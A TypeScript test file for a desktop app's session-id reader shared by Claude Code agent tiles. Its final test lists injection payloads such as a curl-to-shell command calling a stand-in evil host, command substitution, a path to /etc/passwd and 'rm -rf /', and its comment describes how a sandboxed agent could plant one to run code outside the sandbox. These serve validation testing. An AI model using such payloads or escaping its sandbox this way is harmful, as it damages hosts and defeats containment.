import { test, expect, afterEach } from "bun:test";
import { mkdtempSync, mkdirSync, writeFileSync, existsSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

import {
  sanitizeToken,
  deskSessionFileName,
  deskSessionPath,
  readDeskSessionId,
  clearDeskSessionId,
} from "../desktop/src/main/desk-session.ts";
// Cross-check the Deck reader against the core writer (filename must match).
import { writeDeskSessionId, deskSessionFileName as coreFileName } from "../shared/peer-cache.ts";

const tmpDirs: string[] = [];
function tmpPeers(): string {
  const d = mkdtempSync(join(tmpdir(), "cp-desksess-"));
  tmpDirs.push(d);
  return d;
}
afterEach(() => {
  for (const d of tmpDirs.splice(0)) {
    try {
      rmSync(d, { recursive: true, force: true });
    } catch {
      // best-effort
    }
  }
});

test("sanitizeToken mirrors sanitizeSessionId (non [A-Za-z0-9-] -> _, cap 64)", () => {
  expect(sanitizeToken("tile-123")).toBe("tile-123");
  expect(sanitizeToken("a/b c")).toBe("a_b_c");
  expect(sanitizeToken(undefined)).toBe("");
  expect(sanitizeToken("x".repeat(200)).length).toBe(64);
});

test("deskSessionFileName matches the core writer's filename", () => {
  for (const token of ["tile-A", "a/../b", "abc"]) {
    expect(deskSessionFileName(token)).toBe(coreFileName(token));
  }
});

test("readDeskSessionId returns the file content for a token, null when absent", () => {
  const peers = tmpPeers();
  expect(readDeskSessionId("tile-A", peers)).toBeNull();
  writeFileSync(deskSessionPath("tile-A", peers), "real-id-123\n", "utf-8");
  expect(readDeskSessionId("tile-A", peers)).toBe("real-id-123");
});

test("readDeskSessionId returns null for an empty file and an empty token", () => {
  const peers = tmpPeers();
  writeFileSync(deskSessionPath("t", peers), "   \n", "utf-8");
  expect(readDeskSessionId("t", peers)).toBeNull();
  expect(readDeskSessionId("", peers)).toBeNull();
});

test("clearDeskSessionId removes the token file (no throw on miss)", () => {
  const peers = tmpPeers();
  const path = deskSessionPath("t", peers);
  writeFileSync(path, "id", "utf-8");
  expect(existsSync(path)).toBe(true);
  clearDeskSessionId("t", peers);
  expect(existsSync(path)).toBe(false);
  // Second clear on an absent file is a silent no-op.
  expect(() => clearDeskSessionId("t", peers)).not.toThrow();
});

test("round-trip: core writeDeskSessionId is read back by the Deck reader", async () => {
  const home = tmpPeers();
  await writeDeskSessionId(home, {
    CLAUDE_PEERS_DESK_SESSION: "tile-X",
    CLAUDE_CODE_SESSION_ID: "minted-uuid-999",
  });
  const peers = join(home, ".claude", "peers");
  expect(readDeskSessionId("tile-X", peers)).toBe("minted-uuid-999");
});

test("two tiles read their own id with no permutation (D1)", () => {
  const peers = tmpPeers();
  mkdirSync(peers, { recursive: true });
  writeFileSync(deskSessionPath("tileA", peers), "id-A", "utf-8");
  writeFileSync(deskSessionPath("tileB", peers), "id-B", "utf-8");
  expect(readDeskSessionId("tileA", peers)).toBe("id-A");
  expect(readDeskSessionId("tileB", peers)).toBe("id-B");
});

// ----- back-channel value validation (sandbox escape, review finding #1) -----

test("readDeskSessionId REFUSES a tampered value (sandbox escape chain)", () => {
  // The file lives in a dir mounted into sandbox containers, so its content is
  // attacker-controlled. The adopted id later reaches the host shell as
  // `--resume <id>`; without validation a sandboxed agent could plant a payload
  // in another tile's file and have it run OUTSIDE the sandbox.
  const dir = mkdtempSync(join(tmpdir(), "cp-desk-esc-"));
  try {
    for (const payload of [
      "x; curl evil.sh | sh",
      "$(id)",
      "`id`",
      "a b",
      "../../etc/passwd",
      '"; rm -rf /; #',
      "x".repeat(65)
    ]) {
      writeFileSync(join(dir, deskSessionFileName("tok")), payload, "utf-8");
      expect(readDeskSessionId("tok", dir)).toBeNull();
    }
    // A well-formed id still round-trips.
    writeFileSync(join(dir, deskSessionFileName("tok")), "0f9a-BEEF-42\n", "utf-8");
    expect(readDeskSessionId("tok", dir)).toBe("0f9a-BEEF-42");
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});
